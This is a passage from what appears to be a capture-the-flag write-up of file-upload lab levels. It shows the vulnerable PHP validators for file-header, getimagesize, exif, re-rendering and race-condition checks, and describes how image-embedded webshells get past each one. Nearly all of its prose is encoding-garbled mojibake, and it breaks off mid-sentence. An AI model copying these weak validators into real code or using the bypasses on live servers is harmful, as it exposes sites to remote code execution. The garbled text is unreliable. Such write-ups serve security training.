title="å›¾ç‰‡é©¬ä¹‹æ–‡ä»¶å¤´ç»•è¿‡"></a>å›¾ç‰‡é©¬ä¹‹æ–‡ä»¶å¤´ç»•è¿‡</h2><p>è¿™å…³ä¸»è¦è€ƒéªŒåšå›¾ç‰‡é©¬çš„èƒ½åŠ›ï¼Œæ˜¯å¦èƒ½ç»•è¿‡ï¼Œä½†ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå¿…é¡»é…åˆè§£ææ¼æ´æˆ–æ–‡ä»¶åŒ…å«æ¼æ´ç­‰ï¼Œæ‰å¯ä»¥å‘æŒ¥å…¶æ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦èƒ½å°†å›¾ç‰‡é©¬æˆåŠŸä¸Šä¼ ç»•è¿‡å°±ç®—è¿‡å…³ï¼š(ps:Pass-13æ›´æ–°äº†ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ–¹ä¾¿æ‰§è¡Œå›¾ç‰‡é©¬)</p><p><img src="1.assets/image-20211108184340279.png" alt="image-20211108184340279"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ä¸»è¦æ˜¯å¯¹æ–‡ä»¶å¤´çš„ç»•è¿‡ï¼Œæ­£å¸¸å§¿åŠ¿ä¸Šä¼ æ–‡ä»¶é©¬ï¼ŒæˆåŠŸä¸Šä¼ </p><p><img src="1.assets/image-20211108185657167.png" alt="image-20211108185657167"></p><p>é€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä»è€Œå®ç°ä»£ç æ‰§è¡Œ</p><p><img src="1.assets/image-20211108185747219.png" alt="image-20211108185747219"></p><p>pngå’ŒgifåŸç†ä¸€æ ·ï¼Œåªè¦æ–‡ä»¶å¤´ç¬¦åˆå³å¯ç»•è¿‡</p><p><img src="1.assets/image-20211108185913679.png" alt="image-20211108185913679"></p><h2 id="getimagesizeå›¾ç‰‡ç±»å‹ç»•è¿‡"><a href="#getimagesizeå›¾ç‰‡ç±»å‹ç»•è¿‡" class="headerlink" title="getimagesizeå›¾ç‰‡ç±»å‹ç»•è¿‡"></a>getimagesizeå›¾ç‰‡ç±»å‹ç»•è¿‡</h2><p><img src="1.assets/image-20211108190225395.png" alt="image-20211108190225395"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å…³æ˜¯å¯¹getimagesizeçš„ç»•è¿‡ï¼š</p><p>getimagesizeæµ‹å®šæ–‡ä»¶å›¾ç‰‡çš„å¤§å°å¹¶è¿”å›å›¾ç‰‡å°ºå¯¸å’Œç±»å‹ï¼›æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯é€šè¿‡å›¾ç‰‡é©¬ç›´æ¥ä¸Šä¼ </p><p><img src="1.assets/image-20211108190325206.png" alt="image-20211108190325206"></p><p>æ–‡ä»¶åŒ…å«å³å¯</p><p><img src="1.assets/image-20211108190357443.png" alt="image-20211108190357443"></p><h2 id="php-exifæ¨¡å—å›¾ç‰‡ç±»å‹ç»•è¿‡"><a href="#php-exifæ¨¡å—å›¾ç‰‡ç±»å‹ç»•è¿‡" class="headerlink" title="php_exifæ¨¡å—å›¾ç‰‡ç±»å‹ç»•è¿‡"></a>php_exifæ¨¡å—å›¾ç‰‡ç±»å‹ç»•è¿‡</h2><p><img src="1.assets/image-20211108190450486.png" alt="image-20211108190450486"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³æ˜¯å»è¯»å–å›¾ç‰‡ä¸€ä¸ªå­—èŠ‚å¹¶è·å–ç­¾åï¼Œç®€å•ç‚¹ï¼Œè¿˜æ˜¯å»æ£€æµ‹æ˜¯å¦æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ï¼š</p><p><img src="1.assets/image-20211108231231497.png" alt="image-20211108231231497"></p><h2 id="äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºŒæ¬¡æ¸²æŸ“ï¼šå°±æ˜¯æ ¹æ®ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œæ–°ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå°†åŸå§‹å›¾ç‰‡åˆ é™¤ï¼Œå°†æ–°å›¾ç‰‡æ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚æ¯”å¦‚ä¸€äº›ç½‘ç«™æ ¹æ®ç”¨æˆ·ä¸Šä¼ çš„å¤´åƒç”Ÿæˆå¤§ä¸­å°ä¸åŒå°ºå¯¸çš„å›¾åƒã€‚</p><p> æºç åˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“ã€‚</p><p>è¿™é‡Œç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“æ¯”è¾ƒå¥½ç»•ä¸€ç‚¹,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†ï¼›</p><p><img src="1.assets/image-20211109101811468.png" alt="image-20211109101811468"></p><p>ä¸Šä¼ </p><p><img src="1.assets/image-20211109101934331.png" alt="image-20211109101934331"></p><p><img src="1.assets/image-20211109101923939.png" alt="image-20211109101923939"></p><h2 id="æ¡ä»¶ç«äº‰ç»•è¿‡"><a href="#æ¡ä»¶ç«äº‰ç»•è¿‡" class="headerlink" title="æ¡ä»¶ç«äº‰ç»•è¿‡"></a>æ¡ä»¶ç«äº‰ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.assets/image-20211108231332748.png" alt="image-20211108231332748"></p><p>ä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰å‘¢ï¼Ÿæ¡ä»¶ç«äº‰æ˜¯â€œå‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰æ²¡æœ‰è¿›è¡Œé”æ“ä½œæˆ–è€…åŒæ­¥æ“ä½œçš„å¸¸è§â€ï¼›ç«äº‰æ¡ä»¶å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰æ²¡æœ‰è¿›è¡Œé”æ“ä½œæˆ–è€…åŒæ­¥æ“ä½œçš„åœºæ™¯ä¸­ã€‚</p><p>å¼€å‘è€…åœ¨è¿›è¡Œä»£ç å¼€å‘æ—¶å¸¸å¸¸å€¾å‘äºè®¤ä¸ºä»£ç ä¼šä»¥çº¿æ€§çš„æ–¹å¼æ‰§è¡Œï¼Œè€Œä¸”ä»–ä»¬å¿½è§†äº†å¹¶è¡ŒæœåŠ¡å™¨ä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œè¿™å°±ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚æ¯”å¦‚å½“æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å› ä¸ºè¿‡æ»¤åŸå› æˆ–å…¶ä»–åŸå› è¢«åˆ é™¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šå°±æ˜¯å’Œunlink åˆ é™¤æ–‡ä»¶å‡½æ•°ç«äº‰ï¼›</p><p>è¿™é“é¢˜æ˜¯å…ˆå°†æ–‡ä»¶ä¸Šä¼ 